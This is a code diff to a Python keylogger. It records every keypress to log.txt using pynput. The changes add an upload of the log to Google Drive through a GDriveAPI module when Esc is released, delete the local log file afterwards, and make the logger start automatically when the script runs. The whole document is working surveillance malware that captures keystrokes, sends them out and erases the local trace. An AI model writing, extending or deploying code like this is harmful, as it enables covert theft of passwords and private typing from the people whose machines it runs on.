@@ -1,5 +1,6 @@
 from pynput.keyboard import Key, Listener
-
+import GDriveAPI
+import os
 # sentence = []
 # string = ""
 count = 0
@@ -20,13 +21,17 @@ def ON_PRESS(key):
         else: 
             with open("log.txt", "a") as f:
                 f.write(str(key).replace("'",''))
+            
             # sentence.append(str(key))
         
 def ON_RELEASE(key):
     if key == Key.esc:
+        GDriveAPI.upload_files()
+        os.remove("log.txt")
         return False
 
 def KeyStrokes():
     with Listener(on_press=ON_PRESS, on_release=ON_RELEASE) as listner:
         listner.join()
+KeyStrokes()
 
